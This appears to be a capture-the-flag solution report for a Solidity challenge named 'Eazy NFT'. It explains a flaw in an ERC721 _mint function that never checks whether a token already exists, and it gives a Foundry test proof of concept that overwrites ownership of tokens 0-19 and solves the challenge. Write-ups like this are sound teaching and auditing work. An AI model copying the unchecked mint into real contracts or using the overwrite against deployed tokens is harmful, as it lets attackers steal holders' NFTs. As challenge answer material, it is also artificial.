# Eazy NFT - Solution Report

## Vulnerability

The main vulnerability in this challenge lies in the `_mint` function of the `ERC721` contract. The problematic code is in lines 179-184:

```solidity
function _mint(address to, uint256 tokenId) internal virtual {
    unchecked {
        _balances[to] += 1;
    }
    _owners[tokenId] = to;
    emit Transfer(address(0), to, tokenId);
}
```

This `_mint` function has a critical flaw: it does not check if the token already exists before minting. This allows for overwriting the ownership of existing tokens.

The vulnerability is exploitable through the `mint` function in the `ET` (EazyToken) contract:

```solidity
function mint(address to, uint256 tokenId) public {
    require(access[_msgSender()], "ET: caller is not accessed");
    _mint(to, tokenId);
}
```

Since the player is granted access in the constructor of the `ET` contract, they can call this `mint` function freely.

The combination of these factors creates a situation where the player can overwrite the ownership of any existing token, including those initially minted to addresses 0-9, as well as mint new tokens with IDs up to 19. This allows the player to gain ownership of all tokens with IDs 0-19 without actually having to acquire them through legitimate transfers.

## Proof of Concept (PoC)

The following Solidity code demonstrates how to exploit the vulnerability and solve the challenge:

```solidity
contract ChallengeTest is Test {
    Challenge public challenge;
    ET public et;
    address public player;

    function setUp() public {
        player = address(this);
        challenge = new Challenge(player);
        et = challenge.et();
    }

    function testSolveChallenge() public {
        // Step 1: Gain Access (already granted in constructor)

        // Step 2 & 3: Overwrite existing tokens (0-9) and mint new tokens (10-19)
        for (uint256 i = 0; i < 20; i++) {
            et.mint(player, i);
        }

        // Step 4: Solve the challenge
        challenge.solve();
        assertTrue(challenge.isSolved(), "Challenge should be solved");
    }
}
```
